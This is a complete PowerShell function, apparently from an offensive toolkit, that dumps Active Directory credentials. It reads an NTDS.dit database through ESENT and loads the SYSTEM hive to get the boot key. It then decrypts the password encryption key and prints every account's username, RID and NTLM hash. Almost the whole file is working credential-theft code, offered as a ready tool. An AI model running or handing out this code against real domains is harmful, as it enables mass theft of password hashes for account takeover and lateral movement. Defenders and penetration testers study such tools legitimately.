Function lsadump-ntds($ntdsPath,$systemPath)
{

    $ntds = @"   
    [DllImport("esent.dll",SetLastError=true)]
    public static extern JET_err JetSetSystemParameter(ref JET_INSTANCE pinstance,JET_SESID sesid,ulong paramid,ulong lpParam,string szParam);

    [DllImport("esent.dll",SetLastError=true)]
    public static extern JET_err JetCreateInstance(out JET_INSTANCE pinstance,string szInstanceName);

    [DllImport("esent.dll",SetLastError=true)]
    public static extern JET_err JetInit(ref JET_INSTANCE pinstance);

    [DllImport("esent.dll",SetLastError=true)]
    public static extern JET_err JetBeginSession(JET_INSTANCE pinstance,out JET_SESID psesid,string szUserName,string szPassword);

    [DllImport("esent.dll",SetLastError=true)]
    public static extern JET_wrn JetAttachDatabase(JET_SESID sesid,string database,AttachDatabaseGrbit grbit);

    [DllImport("esent.dll",SetLastError=true)]
    public static extern JET_wrn JetOpenDatabase(JET_SESID sesid,string database,string connect,out JET_DBID dbid,OpenDatabaseGrbit grbit);

    [DllImport("esent.dll",SetLastError=true)]
    public static extern JET_wrn JetOpenTable(JET_SESID sesid,JET_DBID dbid,string tablename,byte[] parameters,int parametersSize,OpenTableGrbit grbit,out JET_TABLEID tableid);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto)]
    public static extern int RegOpenKeyEx(int hKey,string subKey,int ulOptions,int samDesired,out int hkResult);

    [DllImport("advapi32.dll", EntryPoint="RegQueryInfoKey", CallingConvention=CallingConvention.Winapi, SetLastError=true)]
    public extern static int RegQueryInfoKey(int hkey,StringBuilder lpClass,ref int lpcbClass,int lpReserved,out int lpcSubKeys,out int lpcbMaxSubKeyLen,out int lpcbMaxClassLen,out int lpcValues,out int lpcbMaxValueNameLen,out int lpcbMaxValueLen,out int lpcbSecurityDescriptor,IntPtr lpftLastWriteTime);

    [DllImport("advapi32.dll", SetLastError=true)]
    public static extern int RegCloseKey(int hKey);
"@

    $antpassword = [Text.Encoding]::ASCII.GetBytes("NTPASSWORD`0")
    $almpassword = [Text.Encoding]::ASCII.GetBytes("LMPASSWORD`0")
    $empty_lm = [byte[]]@(0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee,0xaa,0xd3,0xb4,0x35,0xb5,0x14,0x04,0xee)
    $empty_nt = [byte[]]@(0x31,0xd6,0xcf,0xe0,0xd1,0x6a,0xe9,0x31,0xb7,0x3c,0x59,0xd7,0xe0,0xc0,0x89,0xc0)
    $odd_parity = @(1, 1, 2, 2, 4, 4, 7, 7, 8, 8, 11, 11, 13, 13, 14, 14,
                    16, 16, 19, 19, 21, 21, 22, 22, 25, 25, 26, 26, 28, 28, 31, 31,
                    32, 32, 35, 35, 37, 37, 38, 38, 41, 41, 42, 42, 44, 44, 47, 47,
                    49, 49, 50, 50, 52, 52, 55, 55, 56, 56, 59, 59, 61, 61, 62, 62,
                    64, 64, 67, 67, 69, 69, 70, 70, 73, 73, 74, 74, 76, 76, 79, 79,
                    81, 81, 82, 82, 84, 84, 87, 87, 88, 88, 91, 91, 93, 93, 94, 94,
                    97, 97, 98, 98,100,100,103,103,104,104,107,107,109,109,110,110,
                    112,112,115,115,117,117,118,118,121,121,122,122,124,124,127,127,
                    128,128,131,131,133,133,134,134,137,137,138,138,140,140,143,143,
                    145,145,146,146,148,148,151,151,152,152,155,155,157,157,158,158,
                    161,161,162,162,164,164,167,167,168,168,171,171,173,173,174,174,
                    176,176,179,179,181,181,182,182,185,185,186,186,188,188,191,191,
                    193,193,194,194,196,196,199,199,200,200,203,203,205,205,206,206,
                    208,208,211,211,213,213,214,214,217,217,218,218,220,220,223,223,
                    224,224,227,227,229,229,230,230,233,233,234,234,236,236,239,239,
                    241,241,242,242,244,244,247,247,248,248,251,251,253,253,254,254
                    )

    #return the des keys for the decryption of the hash
    function str_to_key($s)
    {
        $k0 = [int][math]::Floor($s[0] * 0.5)
        $k1 = ( $($s[0] -band 0x01) * 64) -bor [int][math]::Floor($s[1] * 0.25)
        $k2 = ( $($s[1] -band 0x03) * 32) -bor [int][math]::Floor($s[2] * 0.125)
        $k3 = ( $($s[2] -band 0x07) * 16) -bor [int][math]::Floor($s[3] * 0.0625)
        $k4 = ( $($s[3] -band 0x0F) * 8) -bor [int][math]::Floor($s[4] * 0.03125)
        $k5 = ( $($s[4] -band 0x1F) * 4) -bor [int][math]::Floor($s[5] * 0.015625)
        $k6 = ( $($s[5] -band 0x3F) * 2) -bor [int][math]::Floor($s[6] * 0.0078125)
        $k7 = $($s[6] -band 0x7F)

        $key = @($k0, $k1, $k2, $k3, $k4, $k5, $k6, $k7)

        0..7 | %{
            $key[$_] = $odd_parity[($key[$_] * 2)]
        }

        return ,$key
    }

    #using str_to_key to retrieve the des keys from the RID of the user
    function sid_to_key($sid)
    {
        $c0 = $sid -band 255
        $c1 = ($sid -band 65280)/256
        $c2 = ($sid -band 16711680)/65536
        $c3 = ($sid -band 4278190080)/16777216

        $s1 = @($c0, $c1, $c2, $c3, $c0, $c1, $c2)
        $s2 = @($c3, $c0, $c1, $c2, $c3, $c0, $c1) 

        return ,((str_to_key $s1),(str_to_key $s2))
    }

    #Create RC4 key to encrypt and decrypt
    function NewRC4([byte[]]$key)
    {
        return new-object Object |
        Add-Member NoteProperty key $key -PassThru |
        Add-Member NoteProperty S $null -PassThru |
        Add-Member ScriptMethod init {
            if (-not $this.S)
            {
                [byte[]]$this.S = 0..255;
                0..255 | % -begin{[long]$j=0;}{
                    $j = ($j + $this.key[$($_ % $this.key.Length)] + $this.S[$_]) % $this.S.Length;
                    $temp = $this.S[$_]; $this.S[$_] = $this.S[$j]; $this.S[$j] = $temp;
                    }
            }
        } -PassThru |
        Add-Member ScriptMethod "encrypt" {
            $data = $args[0];
            $this.init();
            $outbuf = new-object byte[] $($data.Length);
            $S2 = $this.S[0..$this.S.Length];
            0..$($data.Length-1) | % -begin{$i=0;$j=0;} {
                $i = ($i+1) % $S2.Length;
                $j = ($j + $S2[$i]) % $S2.Length;
                $temp = $S2[$i];$S2[$i] = $S2[$j];$S2[$j] = $temp;
                $a = $data[$_];
                $b = $S2[ $($S2[$i]+$S2[$j]) % $S2.Length ];
                $outbuf[$_] = ($a -bxor $b);
            }
            return ,$outbuf;
        } -PassThru
    }

    #create DES key 
    function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
    {
        $des = new-object Security.Cryptography.DESCryptoServiceProvider;
        $des.Mode = [Security.Cryptography.CipherMode]::ECB;
        $des.Padding = [Security.Cryptography.PaddingMode]::None;
        $des.Key = $key;
        $des.IV = $key;
        $transform = $null;
        if ($doEncrypt) {$transform = $des.CreateEncryptor();}
        else{$transform = $des.CreateDecryptor();}
        $result = $transform.TransformFinalBlock($data, 0, $data.Length);
        return ,$result;
    }

    #decrypt DES
    function des_decrypt([byte[]]$data, [byte[]]$key)
    {
        return ,(des_transform $data $key $false)
    }

    #encrypt DES
    function des_encrypt([byte[]]$data, [byte[]]$key)
    {
        return ,(des_transform $data $key $true)
    }

    #Create AES key and decrypt data(used for newer versions)
    function DecryptAES([byte[]]$data, [byte[]]$key, $iv=[System.Array]::CreateInstance([byte],16))
    {
        $AES = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
        $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC;
        $AES.Padding = [System.Security.Cryptography.PaddingMode]::Zeros; #Check maybe None
        $AES.BlockSize = 128
        $AES.KeySize = 128
        $AES.IV = $iv
        $AES.Key = $key

        $decryptor = $AES.CreateDecryptor()
        $unencryptedData = $decryptor.TransformFinalBlock($data,0,$data.Length)
        return $unencryptedData
    }

 
             
    #Return info about key in registry
    function Get-RegKeyClass([string]$key, [string]$subkey)
    {
        switch ($Key) {
            "HKCR" { $nKey = 0x80000000} #HK Classes Root
            "HKCU" { $nKey = 0x80000001} #HK Current User
            "HKLM" { $nKey = 0x80000002} #HK Local Machine
            "HKU"  { $nKey = 0x80000003} #HK Users
            "HKCC" { $nKey = 0x80000005} #HK Current Config
            default { throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"}
        }
        $KEYQUERYVALUE = 0x1;
        $KEYREAD = 0x19;
        $KEYALLACCESS = 0x3F;
        $result = "";
        [int]$hkey=0
        if (-not [lsadump.ntds]::RegOpenKeyEx($nkey,$subkey,0,$KEYREAD,[ref]$hkey))
        {
            $classVal = New-Object Text.Stringbuilder 1024
            [int]$len = 1024
            if (-not [lsadump.ntds]::RegQueryInfoKey($hkey,$classVal,[ref]$len,0,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,[ref]$null,0))
            {
                $result = $classVal.ToString()
            }
            else{Write-Error "RegQueryInfoKey failed"}   
            [lsadump.ntds]::RegCloseKey($hkey) | Out-Null
        }
        else{Write-Error "Cannot open key"}
        return $result
    }

    #revert your token to your default one
    Function token-revert
    {
        $revert = @"
        [DllImport("advapi32.dll", SetLastError=true)] 
        [return: MarshalAs(UnmanagedType.Bool)] 
        public static extern bool SetThreadToken(IntPtr PHThread,IntPtr Token);
"@
        Add-Type -MemberDefinition $revert -Namespace "token" -Name "revert"
        [token.revert]::SetThreadToken([System.IntPtr]::Zero,[System.IntPtr]::Zero)|Out-Null
    }

    if([System.Security.Principal.WindowsIdentity]::GetCurrent().Name -match "SYSTEM"){token-revert|Out-Null}

    $esent = [System.Reflection.Assembly]::LoadWithPartialName("Microsoft.Isam.Esent.Interop")
    Add-Type -MemberDefinition $ntds -Namespace "lsadump" -Name "ntds" -UsingNamespace @("Microsoft.Isam.Esent.Interop","System.Text") -ReferencedAssemblies $esent.location

    $instance = New-Object Microsoft.Isam.Esent.Interop.JET_INSTANCE
    $sesId = New-Object Microsoft.Isam.Esent.Interop.JET_SESID
    $dbId = New-Object Microsoft.Isam.Esent.Interop.JET_DBID

    #initializing the db, and connecting
    [System.UInt64]$JET_paramDatabasePageSize = 64
    [System.UInt64]$NTDS_PAGE_SIZE = 8192
    $err = [lsadump.ntds]::JetSetSystemParameter([ref]$instance,[Microsoft.Isam.Esent.Interop.JET_SESID]::Nil,$JET_paramDatabasePageSize,$NTDS_PAGE_SIZE,$null)
    if($err -eq [Microsoft.Isam.Esent.Interop.JET_err]::Success)
    {
        [System.UInt64]$JET_paramRecovery = 34
        $err = [lsadump.ntds]::JetSetSystemParameter([ref]$instance,[Microsoft.Isam.Esent.Interop.JET_SESID]::Nil,$JET_paramRecovery,$null,"Off")
        if($err -eq [Microsoft.Isam.Esent.Interop.JET_err]::Success)
        {
            $err = [lsadump.ntds]::JetCreateInstance([ref]$instance,"ntdsdump_0_3")
            if($err -eq [Microsoft.Isam.Esent.Interop.JET_err]::Success)
            {
                $err = [lsadump.ntds]::JetInit([ref]$instance)
                if($err -eq [Microsoft.Isam.Esent.Interop.JET_err]::Success)
                {
                    $err = [lsadump.ntds]::JetBeginSession($instance,[ref]$sesId,$null,$null)
                }
            }
        }
    }

    #attaching and connecting to the database
    $fname = $ntdsPath 
    $wsConnect = [System.String]::Empty
    try
    {
    	$err = [lsadump.ntds]::JetAttachDatabase($sesId,$fname,[Microsoft.Isam.Esent.Interop.AttachDatabaseGrbit]::ReadOnly)
    	if($err -eq [Microsoft.Isam.Esent.Interop.JET_wrn]::Success)
    	{
        	$err = [lsadump.ntds]::JetOpenDatabase($sesId,$fname,$wsConnect,[ref]$dbId,[Microsoft.Isam.Esent.Interop.AttachDatabaseGrbit]::ReadOnly)
        	if($err -eq [Microsoft.Isam.Esent.Interop.JET_wrn]::Success){}
        	else{Write-Host "[x]error at JetOpenDatabase()" -ForegroundColor Red}
    	}
    	else{Write-Host "[x]error at JetAttachDatabase()" -ForegroundColor Red}
    }
    catch{Write-Host "[x]try to repair the database with esentul /r EDB /d, if you have the edb log file also.`nIf not, reapir it with esentul /p <path-to-ntds.dit>" -ForegroundColor Red}


    #Enumerating Columns
    $tableID = New-Object Microsoft.Isam.Esent.Interop.JET_TABLEID
    [System.UInt64]$JET_ColInfoListSortColumnid = 7
    $err = [lsadump.ntds]::JetOpenTable($sesId,$dbId,"datatable",$null,0,[Microsoft.Isam.Esent.Interop.OpenTableGrbit]::ReadOnly -bor [Microsoft.Isam.Esent.Interop.OpenTableGrbit]::Sequential,[ref]$tableID)
    if($err -eq [Microsoft.Isam.Esent.Interop.JET_wrn]::Success)
    {
        $columns = [Microsoft.Isam.Esent.Interop.ColumnInfo[]][Microsoft.Isam.Esent.Interop.Api]::GetTableColumns($sesId, $tableID)
    }

    for($i=0;$i -lt $columns.Count;$i++)
    {
        if($columns[$i].Name -eq "ATTk590689")    {$colId = $i}
        elseif($columns[$i].Name -eq "ATTm3")     {$NamCol = $i}
        elseif($columns[$i].Name -eq "ATTr589970"){$SidCol = $i}
        elseif($columns[$i].Name -eq "ATTk589914"){$NtCol = $i}

    }

    $PekColId = $columns[$colId]
    $NamColId = $columns[$NamCol]
    $SidColId = $columns[$SidCol]
    $NtColId = $columns[$NtCol]

    [Microsoft.Isam.Esent.Interop.Api]::TryMoveFirst($sesId,$tableID)|Out-Null
    $names = @()
    $data = [System.Array]::CreateInstance([byte],0)
    do 
    {
        $nameobject = New-Object psobject

        $temp = [Microsoft.Isam.Esent.Interop.Api]::RetrieveColumn($sesId,$tableID,$PekColId.Columnid)
        if($null -ne $temp){$data += $temp}
    
        $tempName = [Microsoft.Isam.Esent.Interop.Api]::RetrieveColumn($sesId,$tableID,$NamColId.Columnid)
        if($null -ne $tempName)
        {
            Add-Member -InputObject $nameobject -MemberType NoteProperty -Name "SamAccountName" -Value $tempName
        }

        $tempSid = [Microsoft.Isam.Esent.Interop.Api]::RetrieveColumn($sesId,$tableID,$SidColId.Columnid)
        if($null -ne $tempSid)
        {
            Add-Member -InputObject $nameobject -MemberType NoteProperty -Name "Sid" -Value $tempSid
        }
    
        $tempNt = [Microsoft.Isam.Esent.Interop.Api]::RetrieveColumn($sesId,$tableID,$NtColId.Columnid)
        if($null -ne $tempNt)
        {
            Add-Member -InputObject $nameobject -MemberType NoteProperty -Name "NtHash" -Value $tempNt
        }
        if(($null -ne $tempSid) -and ($null -ne $tempNt)){$names += $nameobject}

    }   while ([Microsoft.Isam.Esent.Interop.Api]::TryMoveNext($sesId, $tableID))

    #decrypting the PEK
    $md5 = [System.Security.Cryptography.MD5]::Create()

    $SystemHive = $systemPath
    reg load HKLM\TempHive $SystemHive|Out-Null

    function Get-BootKey
    {
        $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "TempHive\ControlSet001\Control\Lsa\$_"}))
        $b = new-object byte[] $($s.Length/2)
        0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
        $b2 = new-object byte[] 16
        0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
        return ,$b2;
    }

    $bootkey = Get-BootKey
    $to_encrypt = $bootkey
    if($data[0] -eq 2)
    {
        $PekKey = $data[8..$data.Length]
        for($i=0;$i -lt 1000;$i++){$to_encrypt += $PekKey[0..15]}
        $rc4key = $md5.ComputeHash($to_encrypt)
        $rc4 = NewRC4 $rc4key
        $Pek = $rc4.encrypt($PekKey[16..$PekKey.Length])
        $finalPek = $Pek[36..$pek.Length]
    }

    elseif($data[0] -eq 3)
    {
       $decryptedPekList = DecryptAES $data[24..($data.Count -1)] $bootkey $data[8..23]
       $finalPek = $decryptedPekList[36..51]
    }

    #decrypting the hashes of the users!!
    foreach($name in $names)
    {
        $SamAccountName = [System.Text.Encoding]::ASCII.GetString($name.SamAccountName).replace("`0","")
        $rid = [uint32]("0x" + [System.BitConverter]::ToString($name.Sid[($name.Sid.Count -2)..($name.Sid.Count -1)]).replace("-","").ToLower())
        if([System.BitConverter]::ToString($name.NtHash).replace("-","") -match "^1100000000000000"){$nthash = $name.NtHash[8..($name.NtHash.Count -1)]}
        else{$nthash = $name.NtHash}

        if([System.BitConverter]::ToInt32($nthash[0..3],0) -eq 19)
        {
        
           $encntlm = DecryptAES $name.NtHash[28..43] $finalPek $name.NtHash[8..23]
        }

        else
        {
            $rc4key = $md5.ComputeHash($finalPek+$nthash[0..15])
            $rc4 = NewRC4 $rc4key
            $encntlm = $rc4.encrypt($nthash[16..($nthash.Count -1)])
        }

        $deskeys = sid_to_key($rid)
        $hash = (des_decrypt  $encntlm[0..7] $deskeys[0]) + (des_decrypt $encntlm[8..$($encntlm.Length - 1)] $deskeys[1])
        $to_print = "`nUserName: " + $SamAccountName + "`nRid: " + $rid + "`nNtlmHash: " +[System.BitConverter]::ToString($hash).replace("-","").ToLower()
        Write-Host $to_print
    }
    
    #cleaning up everything
    reg unload HKLM\TempHive|Out-Null
    [Microsoft.Isam.Esent.Interop.Api]::JetCloseDatabase($sesId, $dbId, [Microsoft.Isam.Esent.Interop.CloseDatabaseGrbit]::None)
    [Microsoft.Isam.Esent.Interop.Api]::JetDetachDatabase($sesId, $fname)
    [Microsoft.Isam.Esent.Interop.Api]::JetEndSession($sesId, [Microsoft.Isam.Esent.Interop.EndSessionGrbit]::None)
    [Microsoft.Isam.Esent.Interop.Api]::JetTerm($Instance)
}